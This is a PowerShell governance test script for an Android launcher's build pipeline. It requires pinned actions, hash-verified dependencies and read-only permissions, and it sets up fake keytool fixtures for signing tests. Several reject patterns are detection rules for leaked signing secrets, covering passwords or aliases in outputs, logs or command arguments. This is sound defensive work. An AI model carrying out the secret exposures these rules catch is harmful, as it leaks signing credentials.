    -Pattern "(?ms)^  sign-android-candidate:.*?if:\s*github\.ref == 'refs/heads/main'.*?environment:\s*\r?\n\s+name:\s*android-local-signing.*?secrets\.ANDROID_LOCAL_UPDATE_KEYSTORE_BASE64"
Require-Pattern `
    -Description "hash-pinned direct NuGet downloads" `
    -Pattern '(?ms)SENTRY_PACKAGE_SHA256="91a7efd0b3813e06295fb60753744aed79b0567f70b8f7c766e7f0dfd69e15e7".*?ACTUAL_SENTRY_PACKAGE_SHA256.*?SENTRY_PACKAGE_SHA256.*?runtime_version="9\.0\.18".*?expected_pkg_sha256="81f74411bcb9286c5f6b7f11d05b80364ef5738555fda7a3b45215c9f18e12ee".*?actual_pkg_sha256.*?expected_pkg_sha256'
Require-Pattern `
    -Description "locked NuGet restore before no-restore candidate compilation" `
    -Pattern '(?ms)dotnet restore --locked-mode.*?dotnet publish -c Release --no-restore.*?dotnet restore .*?SteamKitAndroidPatch\.csproj" --locked-mode.*?dotnet build .*?SteamKitAndroidPatch\.csproj" -c Release --no-restore'
Require-Pattern `
    -Description "full save-sync and hard-restart gate before candidate build" `
    -Pattern '(?ms)Verify save safety before building candidate.*?test-cloud-sync-production-path\.ps1.*?Build patched Godot Android runtime'
Require-Pattern `
    -Description "byte-evidence tooling gate before candidate build" `
    -Pattern '(?ms)Verify save safety before building candidate.*?test-stage5-save-evidence-manifests\.ps1.*?Build patched Godot Android runtime'
Require-Pattern `
    -Description "affected-device preflight regression gate before candidate build" `
    -Pattern '(?ms)Verify save safety before building candidate.*?test-stage5-affected-device-preflight\.ps1.*?Build patched Godot Android runtime'
Require-Pattern `
    -Description "read-only repository permission" `
    -Pattern '(?ms)^permissions:\s*\r?\n\s{2}contents:\s*read\s*$'

Reject-Pattern `
    -Description "candidate builds must be manually dispatched only" `
    -Pattern '(?m)^\s{2}(push|pull_request|schedule|workflow_run|repository_dispatch):\s*$'
Reject-Pattern `
    -Description "candidate workflow must not contain a publish job" `
    -Pattern '(?im)^\s{2}[^\r\n]*publish[^\r\n]*:\s*$'
Reject-Pattern `
    -Description "candidate workflow must not invoke GitHub release publication" `
    -Pattern '(?i)(action-gh-release|actions/create-release|release-action|gh\s+release\s+(create|edit|upload|delete))'
Reject-Pattern `
    -Description "candidate workflow must not expose a create-release switch" `
    -Pattern '(?i)create_release'
Reject-Pattern `
    -Description "candidate workflow must not request any write permission" `
    -Pattern '(?m)(^\s+[A-Za-z-]+:\s*write\s*$|^permissions:\s*write-all\s*$)'
Reject-Pattern `
    -Description "candidate workflow must not guess a baseline from a release listing" `
    -Pattern '(?i)releases\?per_page'
Reject-Pattern `
    -Description "candidate workflow must not expose a selectable package" `
    -Pattern '(?ms)^    inputs:\s*\r?\n(?:(?!^permissions:).)*?^\s{6}package_name:|github\.event\.inputs\.package_name'
Reject-Pattern `
    -Description "candidate workflow must not expose baseline overrides" `
    -Pattern '(?ms)^    inputs:\s*\r?\n(?:(?!^permissions:).)*?^\s{6}update_baseline_(tag|asset_name|apk_sha256):|github\.event\.inputs\.update_baseline_'
Reject-Pattern `
    -Description "candidate workflow must not contain a baseline-reset bypass" `
    -Pattern '(?i)allow_update_baseline_reset|update_baseline=reset'
Reject-Pattern `
    -Description "candidate workflow must not use the unrelated release-signing credentials" `
    -Pattern 'ANDROID_RELEASE_'
Reject-Pattern `
    -Description "workflow-dispatch inputs or secrets must not be interpolated into run blocks" `
    -Pattern '(?ms)^[ ]{8}run:[ ]*\|[ ]*\r?\n(?:(?!^[ ]{6}-[ ]).)*\$\{\{[ ]*(?:github\.event\.inputs\.|inputs\.|secrets\.)'
Reject-Pattern `
    -Description "signing password or alias must never be written to GITHUB_OUTPUT" `
    -Pattern '(?im)^(?=[^\r\n]*GITHUB_OUTPUT)(?=[^\r\n]*(?:password|alias))[^\r\n]*$'
Reject-Pattern `
    -Description "signing password or alias must not transit through step outputs" `
    -Pattern 'steps\.signing\.outputs\.(?:password|alias)'
Reject-Pattern `
    -Description "signing password or alias must not appear in Gradle command arguments" `
    -Pattern '(?i)-P(?:release_keystore_password|release_keystore_alias)='
Reject-Pattern `
    -Description "Gradle must never receive release signing secrets" `
    -Pattern '(?i)ORG_GRADLE_PROJECT_(?:release_keystore|perform_signing)|-Pperform_signing=true'
Reject-Pattern `
    -Description "mutable or unpinned action references are forbidden" `
    -Pattern '(?m)^\s*uses:\s*[^\s#]+@v[0-9]+'
Reject-Pattern `
    -Description "persistent setup-gradle hooks are forbidden before signing" `
    -Pattern 'gradle/actions/setup-gradle'

Require-ReadinessPattern `
    -Description "fixed published .local package expectation" `
    -Pattern '\$ExpectedPackageName\s*=\s*"com\.sts2launcher\.overhaul\.fork\.local"'
Require-ReadinessPattern `
    -Description "fixed v0.2.416 baseline selection" `
    -Pattern '\$UpdateBaselineTag\s*=\s*"v0\.2\.416-startup-recovery-ime"'
Require-ReadinessPattern `
    -Description "fixed v0.2.416 baseline asset" `
    -Pattern '\$UpdateBaselineAssetName\s*=\s*"StS2Launcher-v0\.2\.416-startup-recovery-ime-local-arm64-v8a\.apk"'
Require-ReadinessPattern `
    -Description "fixed v0.2.416 baseline bytes" `
    -Pattern '\$UpdateBaselineApkSha256\s*=\s*"fdf2dcfcf2352d0e1a370da76922fb5b70cee3654d98c5fe9afbbd39554fc17b"'
Require-ReadinessPattern `
    -Description "dedicated local-update secrets" `
    -Pattern '(?s)ANDROID_LOCAL_UPDATE_KEYSTORE_BASE64.*?ANDROID_LOCAL_UPDATE_KEYSTORE_PASSWORD.*?ANDROID_LOCAL_UPDATE_KEY_ALIAS'
Require-ReadinessPattern `
    -Description "dedicated local-update signer variable" `
    -Pattern 'ANDROID_LOCAL_UPDATE_SIGNER_SHA256'
Require-ReadinessPattern `
    -Description "fixed protected signing environment" `
    -Pattern '\$SigningEnvironment\s*=\s*"android-local-signing"'
Require-ReadinessPattern `
    -Description "fixed protected release branch" `
    -Pattern '\$RequiredReleaseBranch\s*=\s*"main"'
Require-ReadinessPattern `
    -Description "signing environment existence preflight before credential reads" `
    -Pattern '(?s)''api'',\s*''--method'',\s*''GET'',\s*"repos/\$Repo/environments/\$SigningEnvironment".*?missing or inaccessible.*?\$secretRead'
Require-ReadinessPattern `
    -Description "exact main-only branch-policy preflight before credential reads" `
    -Pattern '(?s)deployment_branch_policy.*?custom_branch_policies.*?deployment-branch-policies\?per_page=100.*?total_count\s+-ne\s+1.*?name\s+-cne\s+\$RequiredReleaseBranch.*?type\s+-cne\s+"branch".*?\$secretRead'
Require-ReadinessPattern `
    -Description "environment-scoped secret-name read" `
    -Pattern "'secret', 'list', '--env', \`$SigningEnvironment, '--repo', \`$Repo"
Require-ReadinessPattern `
    -Description "environment-scoped signer-variable read" `
    -Pattern "'variable', 'list', '--env', \`$SigningEnvironment, '--repo', \`$Repo"
Require-ReadinessPattern `
    -Description "actual downloaded baseline identity inspection" `
    -Pattern '(?s)\$baselineIdentity\s*=\s*Get-AndroidApkIdentity.*?-Path\s+\$baselineApkPath'
Require-ReadinessPattern `
    -Description "actual baseline package comparison" `
    -Pattern '\$baselineIdentity\.packageName\s+-ne\s+\$ExpectedPackageName'
Require-ReadinessPattern `
    -Description "actual baseline signer comparison" `
    -Pattern '\$baselineIdentity\.signerSha256\s+-ne\s+\$expectedSignerSha256'
Require-ReadinessPattern `
    -Description "baseline byte comparison" `
    -Pattern '\$actualBaselineSha256\s+-ne\s+\$expectedBaselineSha256'
Require-ReadinessPattern `
    -Description "repo Android SDK fallback" `
    -Pattern '\.w40k-android-toolchain\\android-sdk'
Require-ReadinessPattern `
    -Description "repo JDK fallback" `
    -Pattern '\.w40k-android-toolchain\\jdk-17'
Require-ReadinessPattern `
    -Description "Android SDK environment restoration" `
    -Pattern 'Remove-Item\s+Env:ANDROID_SDK_ROOT'
Require-ReadinessPattern `
    -Description "Java environment restoration" `
    -Pattern 'Remove-Item\s+Env:JAVA_HOME'
Reject-ReadinessPattern `
    -Description "package or baseline must not be caller-overridable" `
    -Pattern '(?m)^\s*\[string\]\$(ExpectedPackageName|UpdateBaselineTag|UpdateBaselineAssetName|UpdateBaselineApkSha256)\b'
Reject-ReadinessPattern `
    -Description "readiness must not accept unrelated release-signing credentials" `
    -Pattern 'ANDROID_RELEASE_'
Reject-ReadinessPattern `
    -Description "readiness must not inspect repository-scoped secret names" `
    -Pattern "'secret', 'list', '--repo'"
Reject-ReadinessPattern `
    -Description "readiness must not inspect repository-scoped variables" `
    -Pattern "'variable', 'list', '--repo'"

Require-ConfiguratorPattern `
    -Description "published v0.2.416 signer pin" `
    -Pattern 'FD0E3D5ACF435C1D23BFC5C426E99AA9EB5808619FF1FC214FFCA99CFAC7E57A'
Require-ConfiguratorPattern `
    -Description "dedicated local-update secret writes" `
    -Pattern "(?s)'secret', 'set', 'ANDROID_LOCAL_UPDATE_KEYSTORE_BASE64'.*?'secret', 'set', 'ANDROID_LOCAL_UPDATE_KEYSTORE_PASSWORD'.*?'secret', 'set', 'ANDROID_LOCAL_UPDATE_KEY_ALIAS'"
Require-ConfiguratorPattern `
    -Description "dedicated local-update signer-variable write" `
    -Pattern "'variable', 'set', 'ANDROID_LOCAL_UPDATE_SIGNER_SHA256'"
Require-ConfiguratorPattern `
    -Description "fixed protected signing environment" `
    -Pattern '\$signingEnvironment\s*=\s*"android-local-signing"'
Require-ConfiguratorPattern `
    -Description "exact release branch policy" `
    -Pattern '\$requiredReleaseBranch\s*=\s*"main"'
Require-ConfiguratorPattern `
    -Description "exact main-only branch-policy preflight before writes" `
    -Pattern '(?s)environments/\$signingEnvironment.*?deployment_branch_policy.*?custom_branch_policies.*?deployment-branch-policies\?per_page=100.*?total_count\s+-ne\s+1.*?name\s+-cne\s+\$requiredReleaseBranch.*?type\s+-cne\s+"branch".*?Invoke-ProcessWithStandardInput'
Require-ConfiguratorPattern `
    -Description "environment-scoped key, password, alias, and signer writes" `
    -Pattern "(?s)'secret', 'set', 'ANDROID_LOCAL_UPDATE_KEYSTORE_BASE64', '--env', \`$signingEnvironment.*?'secret', 'set', 'ANDROID_LOCAL_UPDATE_KEYSTORE_PASSWORD', '--env', \`$signingEnvironment.*?'secret', 'set', 'ANDROID_LOCAL_UPDATE_KEY_ALIAS', '--env', \`$signingEnvironment.*?'variable', 'set', 'ANDROID_LOCAL_UPDATE_SIGNER_SHA256', '--env', \`$signingEnvironment"
Require-ConfiguratorPattern `
    -Description "keystore bytes supplied to GitHub only through standard input" `
    -Pattern "(?s)-Arguments\s+@\('secret', 'set', 'ANDROID_LOCAL_UPDATE_KEYSTORE_BASE64'.*?-StandardInput\s+\`$keystoreBase64"
Require-ConfiguratorPattern `
    -Description "keystore password supplied to GitHub only through standard input" `
    -Pattern "(?s)-Arguments\s+@\('secret', 'set', 'ANDROID_LOCAL_UPDATE_KEYSTORE_PASSWORD'.*?-StandardInput\s+\`$KeystorePassword"
Require-ConfiguratorPattern `
    -Description "keystore alias supplied to GitHub only through standard input" `
    -Pattern "(?s)-Arguments\s+@\('secret', 'set', 'ANDROID_LOCAL_UPDATE_KEY_ALIAS'.*?-StandardInput\s+\`$KeyAlias"
Require-ConfiguratorPattern `
    -Description "signer fingerprint supplied to GitHub only through standard input" `
    -Pattern "(?s)-Arguments\s+@\('variable', 'set', 'ANDROID_LOCAL_UPDATE_SIGNER_SHA256'.*?-StandardInput\s+\`$signerSha256"
Require-ConfiguratorPattern `
    -Description "wrong-key rejection before repository writes" `
    -Pattern '(?s)if \(\$signerSha256 -ne \$expectedSigner\).*?No GitHub secret or variable was changed\..*?Invoke-ProcessWithStandardInput'
Require-ConfiguratorPattern `
    -Description "verified offline-key-backup confirmation before repository writes" `
    -Pattern '(?s)if \(-not \$OfflineBackupConfirmed\).*?No GitHub secret or variable was changed\..*?Invoke-ProcessWithStandardInput'
Require-ConfiguratorPattern `
    -Description "repo JDK keytool auto-discovery" `
    -Pattern '(?s)KeytoolPath\s*=\s*"".*?Get-KeystoreSignerSha256'
Reject-ConfiguratorPattern `
    -Description "unrelated release-signing credentials remain" `
    -Pattern 'ANDROID_RELEASE_'
Reject-ConfiguratorPattern `
    -Description "published signer must not be caller-overridable" `
    -Pattern '(?m)^\s*\[string\]\$ExpectedSignerSha256\b'
Reject-ConfiguratorPattern `
    -Description "secret values must never be passed through GitHub CLI --body arguments" `
    -Pattern '(?i)--body'
Reject-ConfiguratorPattern `
    -Description "secret values must never be embedded in GitHub CLI arguments" `
    -Pattern '(?is)-Arguments\s+@\([^\)]*\$(?:KeystorePassword|KeyAlias|keystoreBase64)'
Reject-ConfiguratorPattern `
    -Description "secret values must never be printed" `
    -Pattern '(?im)Write-(?:Host|Output|Verbose|Debug|Information|Warning).*\$(?:KeystorePassword|KeyAlias|keystoreBase64)'

Require-StaticPattern `
    -Content $governanceWorkflow `
    -Subject 'governance workflow' `
    -Description 'immutable checkout action' `
    -Pattern 'actions/checkout@11d5960a326750d5838078e36cf38b85af677262\s+#\s+v4\.4\.0'
Require-StaticPattern `
    -Content $governanceWorkflow `
    -Subject 'governance workflow' `
    -Description 'immutable .NET setup action' `
    -Pattern 'actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9\s+#\s+v4\.3\.1'
Require-StaticPattern `
    -Content $governanceWorkflow `
    -Subject 'governance workflow' `
    -Description 'immutable artifact action' `
    -Pattern 'actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02\s+#\s+v4\.6\.2'
Require-StaticPattern `
    -Content $governanceWorkflow `
    -Subject 'governance workflow' `
    -Description 'affected-device preflight regression gate' `
    -Pattern 'test-stage5-affected-device-preflight\.ps1'
$allowedGovernanceActions = @(
    'actions/checkout@11d5960a326750d5838078e36cf38b85af677262',
    'actions/setup-dotnet@67a3573c9a986a3f9c594539f4ab511d57bb3ce9',
    'actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02'
)
foreach ($governanceActionMatch in [Regex]::Matches($governanceWorkflow, '(?m)^\s*uses:\s*([^\s#]+)')) {
    $governanceAction = $governanceActionMatch.Groups[1].Value
    if ($allowedGovernanceActions -notcontains $governanceAction) {
        throw "Stage 5 governance workflow action is not an allowed exact official commit: $governanceAction"
    }
}
$governanceCheckoutCount = [Regex]::Matches($governanceWorkflow, 'actions/checkout@').Count
$governanceNonPersistentCheckoutCount = [Regex]::Matches(
    $governanceWorkflow,
    '(?m)uses:\s*actions/checkout@[A-Fa-f0-9]{40}\s+#[^\r\n]*\r?\n\s+with:\s*\r?\n\s+persist-credentials:\s*false'
).Count
if ($governanceCheckoutCount -ne $governanceNonPersistentCheckoutCount) {
    throw 'Stage 5 governance workflow must disable persisted checkout credentials on every job.'
}

Require-StaticPattern `
    -Content $gradleWrapperProperties `
    -Subject 'Gradle wrapper' `
    -Description 'fixed Gradle 8.11.1 distribution' `
    -Pattern 'distributionUrl=https\\://services\.gradle\.org/distributions/gradle-8\.11\.1-bin\.zip'
Require-StaticPattern `
    -Content $gradleWrapperProperties `
    -Subject 'Gradle wrapper' `
    -Description 'verified Gradle distribution bytes' `
    -Pattern 'distributionSha256Sum=f397b287023acdba1e9f6fc5ea72d22dd63669d59ed4a289a29b1a76eee151c6'
$gradleWrapperJarSha256 = (
    Get-FileHash -LiteralPath $gradleWrapperJarPath -Algorithm SHA256
).Hash.ToLowerInvariant()
if ($gradleWrapperJarSha256 -ne '2db75c40782f5e8ba1fc278a5574bab070adccb2d21ca5a6e5ed840888448046') {
    throw "Stage 5 Gradle wrapper JAR hash mismatch: $gradleWrapperJarSha256"
}

try {
    [xml]$gradleVerification = $gradleVerificationMetadata
} catch {
    throw 'Stage 5 Gradle dependency-verification metadata is not valid XML.'
}
$verificationNamespaces = New-Object Xml.XmlNamespaceManager($gradleVerification.NameTable)
$verificationNamespaces.AddNamespace(
    'verification',
    $gradleVerification.DocumentElement.NamespaceURI
)
$verifiedGradleArtifacts = @($gradleVerification.SelectNodes(
    '//verification:artifact',
    $verificationNamespaces
))
if ($verifiedGradleArtifacts.Count -lt 1) {
    throw 'Stage 5 Gradle dependency-verification metadata contains no artifacts.'
}
foreach ($artifact in $verifiedGradleArtifacts) {
    $checksums = @($artifact.SelectNodes('verification:sha256', $verificationNamespaces))
    if ($checksums.Count -lt 1 -or
        @($checksums | Where-Object { $_.value -notmatch '^[a-f0-9]{64}$' }).Count -gt 0) {
        throw "Stage 5 Gradle artifact lacks an exact SHA-256: $($artifact.name)"
    }
}

foreach ($lockPath in $nugetLockPaths) {
    try {
        $lock = Get-Content -LiteralPath $lockPath -Raw | ConvertFrom-Json
    } catch {
        throw "Stage 5 NuGet lock is invalid JSON: $lockPath"
    }
    $framework = $lock.dependencies.'net9.0'
    $dependencies = @($framework.PSObject.Properties)
    if ($dependencies.Count -lt 1) {
        throw "Stage 5 NuGet lock contains no net9.0 dependencies: $lockPath"
    }
    foreach ($dependency in $dependencies) {
        if ($dependency.Value.type -ne 'Project' -and
            $dependency.Value.contentHash -notmatch '^[A-Za-z0-9+/]{86}==$') {
            throw "Stage 5 NuGet dependency lacks an exact content hash: $($dependency.Name) in $lockPath"
        }
    }
}

Require-StaticPattern `
    -Content $godotSetup `
    -Subject 'Godot setup' `
    -Description 'exact 4.5.1-stable commit verification' `
    -Pattern 'EXPECTED_GODOT_COMMIT="f62fdbde15035c5576dad93e586201f4d41ef0cb"'
Require-StaticPattern `
    -Content $godotSetup `
    -Subject 'Godot setup' `
    -Description 'fail-closed Godot HEAD comparison' `
    -Pattern '\[ "\$ACTUAL_GODOT_COMMIT" != "\$EXPECTED_GODOT_COMMIT" \]'
Require-StaticPattern `
    -Content $godotSetup `
    -Subject 'Godot setup' `
    -Description 'hash-enforced SCons requirements install' `
    -Pattern 'pip install --require-hashes -r "\$ROOT/scripts/requirements-godot-build\.txt"'
if ($godotSetup -match 'pip install --upgrade pip') {
    throw 'Stage 5 Godot setup still executes a mutable pip upgrade.'
}
Require-StaticPattern `
    -Content $godotSetupPowerShell `
    -Subject 'PowerShell Godot setup' `
    -Description 'exact 4.5.1-stable commit verification' `
    -Pattern '\$expectedGodotCommit\s*=\s*"f62fdbde15035c5576dad93e586201f4d41ef0cb"'
Require-StaticPattern `
    -Content $godotSetupPowerShell `
    -Subject 'PowerShell Godot setup' `
    -Description 'hash-enforced SCons requirements install' `
    -Pattern 'pip install --require-hashes -r \(Join-Path \$root "scripts\\requirements-godot-build\.txt"\)'
if ($godotSetupPowerShell -match 'pip install --upgrade pip') {
    throw 'Stage 5 PowerShell Godot setup still executes a mutable pip upgrade.'
}
Require-StaticPattern `
    -Content $godotRequirements `
    -Subject 'Godot build requirements' `
    -Description 'exact SCons wheel bytes' `
    -Pattern '(?ms)^scons==4\.10\.1\s+\\\s*--hash=sha256:bd9d1c52f908d874eba92a8c0c0a8dcf2ed9f3b88ab956d0fce1da479c4e7126\s*$'

Require-StaticPattern `
    -Content $signingUtils `
    -Subject 'signing utility' `
    -Description 'exact secret values supplied through redirected standard input' `
    -Pattern '(?s)RedirectStandardInput\s*=\s*\$true.*?UTF8Encoding\(\$false\).*?Console\]::InputEncoding\s*=\s*\$standardInputEncoding.*?StandardInput\.Write\(\$StandardInput\).*?StandardInput\.Close\(\)'
Require-StaticPattern `
    -Content $signingUtils `
    -Subject 'signing utility' `
    -Description 'keytool password environment option' `
    -Pattern "'-storepass:env'\s+\`$passwordEnvironmentName"
if ($signingUtils -match '(?i)-storepass\s+\$KeystorePassword') {
    throw 'Stage 5 signing utility exposes the keystore password in keytool arguments.'
}
if ($signingUtils -match "keytool failed for alias.*\`$KeyAlias") {
    throw 'Stage 5 signing utility prints the keystore alias on keytool failure.'
}
Require-StaticPattern `
    -Content $updateCompatibility `
    -Subject 'update compatibility verifier' `
    -Description 'caller-supplied fixed Android build tools' `
    -Pattern '(?s)\[string\]\$Aapt\s*=\s*"".*?\[string\]\$ApkSigner\s*=\s*"".*?Get-AndroidApkIdentity -Path \$ApkPath -Aapt \$Aapt -ApkSigner \$ApkSigner.*?Get-AndroidApkIdentity -Path \$PreviousApkPath -Aapt \$Aapt -ApkSigner \$ApkSigner'

$requiredPackagePattern = 'com\.sts2launcher\.overhaul\.fork\.local'
$requiredSignerPattern = 'fd0e3d5acf435c1d23bfc5c426e99aa9eb5808619ff1fc214ffca99cfac7e57a'
$requiredBaselineTagPattern = 'v0\.2\.416-startup-recovery-ime'
$requiredBaselineAssetPattern = 'StS2Launcher-v0\.2\.416-startup-recovery-ime-local-arm64-v8a\.apk'
$requiredBaselineHashPattern = 'fdf2dcfcf2352d0e1a370da76922fb5b70cee3654d98c5fe9afbbd39554fc17b'

Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'fixed affected-user .local package' `
    -Pattern "(?m)^\`$requiredCandidatePackage\s*=\s*`"$requiredPackagePattern`"\s*`$"
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'fixed published v0.2.416 signer' `
    -Pattern "(?s)\`$requiredCandidateSignerSha256\s*=\s*`"$requiredSignerPattern`""
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'fixed update-baseline tag' `
    -Pattern "(?m)^\`$requiredBaselineTag\s*=\s*`"$requiredBaselineTagPattern`"\s*`$"
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'fixed update-baseline asset' `
    -Pattern "(?s)\`$requiredBaselineAsset\s*=\s*`"$requiredBaselineAssetPattern`""
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'fixed update-baseline bytes' `
    -Pattern "(?s)\`$requiredBaselineSha256\s*=\s*`"$requiredBaselineHashPattern`""
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'published v0.2.416 versionCode floor' `
    -Pattern '(?m)^\$requiredMinimumVersionCode\s*=\s*416001\s*$'
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'package pin enforcement' `
    -Pattern "(?m)Assert-Equal\s+-Label\s+'Required affected-user package'.*?-Expected\s+\`$requiredCandidatePackage"
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'signer pin enforcement' `
    -Pattern "(?m)Assert-Equal\s+-Label\s+'Required v0\.2\.416 update signer'.*?-Expected\s+\`$requiredCandidateSignerSha256"
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'version floor enforcement' `
    -Pattern "(?m)versionCode\s+-gt\s+\`$requiredMinimumVersionCode"
Require-StaticPattern `
    -Content $matrixReviewer `
    -Subject 'matrix reviewer' `
    -Description 'exact update-baseline identity enforcement' `
    -Pattern "(?s)'Required update-baseline tag'.*?-Expected\s+\`$requiredBaselineTag.*?'Required update-baseline asset'.*?-Expected\s+\`$requiredBaselineAsset.*?'Required update-baseline APK SHA-256'.*?-Expected\s+\`$requiredBaselineSha256"

Require-StaticPattern `
    -Content $matrixTemplate `
    -Subject 'matrix template' `
    -Description 'fixed affected-user .local package' `
    -Pattern "packageName\s*=\s*'$requiredPackagePattern'"
Require-StaticPattern `
    -Content $matrixTemplate `
    -Subject 'matrix template' `
    -Description 'fixed published v0.2.416 signer' `
    -Pattern "signerSha256\s*=\s*'$requiredSignerPattern'"
Require-StaticPattern `
    -Content $matrixTemplate `
    -Subject 'matrix template' `
    -Description 'candidate version newer than the pinned floor' `
    -Pattern "versionCode\s*=\s*'417003'"
Require-StaticPattern `
    -Content $matrixTemplate `
    -Subject 'matrix template' `
    -Description 'fixed update-baseline tag' `
    -Pattern "updateBaselineTag\s*=\s*'$requiredBaselineTagPattern'"
Require-StaticPattern `
    -Content $matrixTemplate `
    -Subject 'matrix template' `
    -Description 'fixed update-baseline asset' `
    -Pattern "updateBaselineAssetName\s*=\s*'$requiredBaselineAssetPattern'"
Require-StaticPattern `
    -Content $matrixTemplate `
    -Subject 'matrix template' `
    -Description 'fixed update-baseline bytes' `
    -Pattern "updateBaselineApkSha256\s*=\s*'$requiredBaselineHashPattern'"

. $signingUtilsPath
$signingProcessTestRoot = Join-Path (
    [IO.Path]::GetTempPath()
) "sts2-signing-process-test-$([Guid]::NewGuid().ToString('N'))"
$signingProcessTestRoot = [IO.Path]::GetFullPath($signingProcessTestRoot)
$temporaryRoot = [IO.Path]::GetFullPath([IO.Path]::GetTempPath())
$temporaryPrefix = $temporaryRoot.TrimEnd(
    [IO.Path]::DirectorySeparatorChar,
    [IO.Path]::AltDirectorySeparatorChar
) + [IO.Path]::DirectorySeparatorChar
if (-not $signingProcessTestRoot.StartsWith($temporaryPrefix, [StringComparison]::OrdinalIgnoreCase) -or
    [IO.Path]::GetFileName($signingProcessTestRoot) -notmatch '^sts2-signing-process-test-[0-9a-f]{32}$') {
    throw "Refusing unsafe signing-process test path: $signingProcessTestRoot"
}

$testEnvironmentNames = @(
    'STS2_FAKE_KEYTOOL_ARGUMENTS',
    'STS2_FAKE_KEYTOOL_PASSWORD_ENVIRONMENT',
    'STS2_FAKE_KEYTOOL_EXPECTED_PASSWORD',
    'STS2_FAKE_KEYTOOL_EXPECTED_ALIAS',
    'STS2_FAKE_KEYTOOL_FAIL',
    'STS2_FAKE_PROCESS_ARGUMENTS',
    'STS2_FAKE_PROCESS_INPUT_HASH'
)
$previousTestEnvironment = @{}
foreach ($environmentName in $testEnvironmentNames) {
    $previousTestEnvironment[$environmentName] = [Environment]::GetEnvironmentVariable(
        $environmentName,
        [EnvironmentVariableTarget]::Process
    )
}

function Get-TestStringSha256 {
    param([Parameter(Mandatory = $true)][string]$Value)

    $algorithm = [Security.Cryptography.SHA256]::Create()
    try {
        $bytes = [Text.Encoding]::UTF8.GetBytes($Value)
        return (($algorithm.ComputeHash($bytes) | ForEach-Object {
            $_.ToString('x2')
        }) -join '')
    } finally {
        $algorithm.Dispose()
    }
}

try {
    $null = New-Item -ItemType Directory -Path $signingProcessTestRoot
    $hostExecutable = (Get-Process -Id $PID).Path
    $fakeKeytoolArguments = Join-Path $signingProcessTestRoot 'keytool-arguments.txt'
    $fakeKeytoolPasswordEnvironment = Join-Path $signingProcessTestRoot 'keytool-password-environment.txt'
    $dummyKeystore = Join-Path $signingProcessTestRoot 'fixture.keystore'
    [IO.File]::WriteAllBytes($dummyKeystore, [byte[]](1, 2, 3, 4))

    if ($env:OS -eq 'Windows_NT') {
        $fakeKeytool = Join-Path $signingProcessTestRoot 'fake-keytool.cmd'
        $wrapperText = @'
@echo off
setlocal EnableExtensions
type nul > "%STS2_FAKE_KEYTOOL_ARGUMENTS%"
set "captureNext="
set "captureAliasNext="
set "passwordEnvironmentName="
set "keyAlias="
:capture
if "%~1"=="" goto captured
>> "%STS2_FAKE_KEYTOOL_ARGUMENTS%" echo(%~1
if defined captureNext (
  set "passwordEnvironmentName=%~1"
  set "captureNext="
) else if defined captureAliasNext (
  set "keyAlias=%~1"
  set "captureAliasNext="
) else if "%~1"=="-storepass:env" (
  set "captureNext=1"
) else if "%~1"=="-alias" (
  set "captureAliasNext=1"
)
shift
goto capture
:captured
if not defined passwordEnvironmentName exit /b 4
> "%STS2_FAKE_KEYTOOL_PASSWORD_ENVIRONMENT%" echo(%passwordEnvironmentName%
call set "receivedPassword=%%%passwordEnvironmentName%%%"
if not "%receivedPassword%"=="%STS2_FAKE_KEYTOOL_EXPECTED_PASSWORD%" exit /b 5
if not "%keyAlias%"=="%STS2_FAKE_KEYTOOL_EXPECTED_ALIAS%" exit /b 6
if "%STS2_FAKE_KEYTOOL_FAIL%"=="1" (
  >&2 echo failure password=%receivedPassword% alias=%keyAlias%
  exit /b 7
)
echo SHA256: FD:0E:3D:5A:CF:43:5C:1D:23:BF:C5:C4:26:E9:9A:A9:EB:58:08:61:9F:F1:FC:21:4F:FC:A9:9C:FA:C7:E5:7A
'@
    } else {
        $fakeKeytool = Join-Path $signingProcessTestRoot 'fake-keytool.sh'
        $wrapperText = @'
#!/bin/sh
set -eu
: > "$STS2_FAKE_KEYTOOL_ARGUMENTS"
password_environment=''
key_alias=''
capture_next=0
capture_alias_next=0
for argument in "$@"; do
  printf '%s\n' "$argument" >> "$STS2_FAKE_KEYTOOL_ARGUMENTS"
  if [ "$capture_next" -eq 1 ]; then
    password_environment="$argument"
    capture_next=0
  elif [ "$capture_alias_next" -eq 1 ]; then
    key_alias="$argument"
    capture_alias_next=0
  elif [ "$argument" = '-storepass:env' ]; then
    capture_next=1
  elif [ "$argument" = '-alias' ]; then
    capture_alias_next=1
  fi
done
[ -n "$password_environment" ] || exit 4
printf '%s' "$password_environment" > "$STS2_FAKE_KEYTOOL_PASSWORD_ENVIRONMENT"
eval "received_password=\${$password_environment}"
[ "$received_password" = "$STS2_FAKE_KEYTOOL_EXPECTED_PASSWORD" ] || exit 5
[ "$key_alias" = "$STS2_FAKE_KEYTOOL_EXPECTED_ALIAS" ] || exit 6
if [ "${STS2_FAKE_KEYTOOL_FAIL:-}" = '1' ]; then
  printf 'failure password=%s alias=%s\n' "$received_password" "$key_alias" >&2
  exit 7
fi
printf '%s\n' 'SHA256: FD:0E:3D:5A:CF:43:5C:1D:23:BF:C5:C4:26:E9:9A:A9:EB:58:08:61:9F:F1:FC:21:4F:FC:A9:9C:FA:C7:E5:7A'
'@
    }
    [IO.File]::WriteAllText($fakeKeytool, $wrapperText, (New-Object Text.UTF8Encoding($false)))
    if ($env:OS -ne 'Windows_NT') {
        & chmod 700 $fakeKeytool
        if ($LASTEXITCODE -ne 0) {
            throw 'Could not make the fake keytool executable.'
        }
    }

    [Environment]::SetEnvironmentVariable(
        'STS2_FAKE_KEYTOOL_ARGUMENTS',
        $fakeKeytoolArguments,
        [EnvironmentVariableTarget]::Process
    )
